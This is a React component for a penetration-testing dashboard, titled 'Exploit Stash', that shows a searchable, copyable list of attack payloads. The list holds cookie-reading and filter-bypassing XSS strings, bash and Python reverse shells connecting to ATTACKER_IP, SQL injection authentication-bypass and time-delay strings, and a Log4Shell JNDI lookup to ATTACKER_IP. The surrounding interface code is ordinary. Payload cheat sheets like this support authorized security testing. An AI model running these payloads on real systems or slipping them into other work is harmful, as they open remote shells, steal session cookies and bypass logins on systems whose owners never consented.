import { useState } from "react";
import { Terminal, Copy, Search, Code, Zap } from "lucide-react";

export default function Payloads() {
  const [filter, setFilter] = useState("");
  
  const PAYLOADS = [
    { category: "Web", title: "Standard XSS", content: "<script>alert(document.cookie)</script>", desc: "Basic test for persistent or reflected XSS." },
    { category: "Web", title: "Polyglot XSS", content: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/(alert)(1)//'>", desc: "Complex payload to bypass various filters." },
    { category: "Shell", title: "Bash Reverse", content: "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", desc: "Classic bash TCP reverse shell." },
    { category: "Shell", title: "Python Reverse", content: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", desc: "Python3 reverse shell with pty spawn." },
    { category: "SQLi", title: "Auth Bypass", content: "' OR 1=1 --", desc: "Classic authentication bypass attempt." },
    { category: "SQLi", title: "Time delay", content: "'; WAITFOR DELAY '0:0:5'--", desc: "Confirm SQLi via time delay (MSSQL)." },
    { category: "Misc", title: "Log4Shell", content: "${jndi:ldap://ATTACKER_IP:1389/a}", desc: "Check for Log4j vulnerability." },
  ];

  const filtered = PAYLOADS.filter(p => p.title.toLowerCase().includes(filter.toLowerCase()) || p.category.toLowerCase().includes(filter.toLowerCase()));

  const copy = (text: string) => navigator.clipboard.writeText(text);

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center border-b border-green-900 pb-4">
        <h2 className="text-xl font-bold flex items-center gap-2">
          <Zap className="text-purple-500" /> Exploit Stash
        </h2>
        <div className="relative">
          <Search className="absolute left-2 top-2 text-green-900" size={14} />
          <input 
            value={filter}
            onChange={e => setFilter(e.target.value)}
            className="bg-black border border-green-900 pl-8 pr-2 py-1 rounded text-xs focus:outline-none focus:border-green-500 w-48"
            placeholder="Search payloads..."
          />
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {filtered.map(p => (
          <div key={p.title} className="border border-green-900 bg-black/40 rounded p-4 flex flex-col space-y-3">
            <div className="flex justify-between items-start">
              <div>
               <span className="text-[9px] uppercase font-bold text-green-700 block mb-1">{p.category}</span>
               <h3 className="font-bold text-green-100">{p.title}</h3>
              </div>
              <button 
                onClick={() => copy(p.content)}
                className="p-1 hover:bg-green-900/20 text-green-700 hover:text-green-500 rounded"
              >
                <Copy size={16} />
              </button>
            </div>
            <p className="text-xs text-green-800 italic">{p.desc}</p>
            <div className="bg-black border border-green-900/50 p-2 rounded text-xs font-mono text-blue-400 overflow-x-auto whitespace-nowrap">
              {p.content}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}
